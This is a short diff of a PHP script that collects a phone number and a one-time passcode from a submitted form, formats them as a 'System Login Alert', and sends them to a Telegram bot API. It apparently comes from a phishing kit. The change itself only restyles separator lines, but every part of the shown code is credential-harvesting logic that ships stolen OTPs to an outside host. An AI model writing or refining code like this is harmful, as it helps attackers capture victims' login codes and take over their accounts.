@@ -8,7 +8,7 @@ $otp=$_POST['otp'] ?? '';
 
 $message  = "📱 System Login Alert\n";
 $message  = "System Login Alert\n";
-$message .= "------------------\n";
+$message .= "━━━━━━━━━━━━━━\n";
 $message .= "Phone:\n`".$number."`\n";
 
 if(!empty($otp)){
@@ -16,7 +16,7 @@ $message .= "OTP:\n`".$otp."`\n";
 }
 
 $message .= "Time: ".date("d/m/Y H:i:s")."\n";
-$message .= "------------------";
+$message .= "━━━━━━━━━━━━━━";
 
 $url="https://api.telegram.org/bot".$botToken."/sendMessage";
 
